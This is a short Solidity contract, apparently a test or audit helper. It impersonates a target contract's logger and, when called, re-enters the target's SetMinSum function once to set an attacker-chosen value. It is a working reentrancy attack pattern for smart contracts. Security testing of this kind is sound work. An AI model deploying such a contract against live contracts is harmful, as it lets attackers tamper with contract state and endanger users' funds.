// Adversarial helper: when C calls LogFile.AddMessage (in Put/fallback), this attacker will reenter
// and call SetMinSum again to change MinSum to some other value (attackerChosen).
contract ReentrantLog {
    address immutable target;
    uint256 immutable attackerChosen;
    bool reentered;

    constructor(address _target, uint256 _attackerChosen) {
        target = _target;
        attackerChosen = _attackerChosen;
        reentered = false;
    }

    // Matches Log.AddMessage signature; will be called by C.Put or other flows
    function AddMessage(address, uint, string memory) public {
        // reenter only once to avoid infinite recursion
        if (!reentered) {
            reentered = true;
            // attempt to reenter SetMinSum on C
            C(target).SetMinSum(attackerChosen);
        }
    }

    // fallback to accept any calls
    fallback() external payable {}
    receive() external payable {}
}

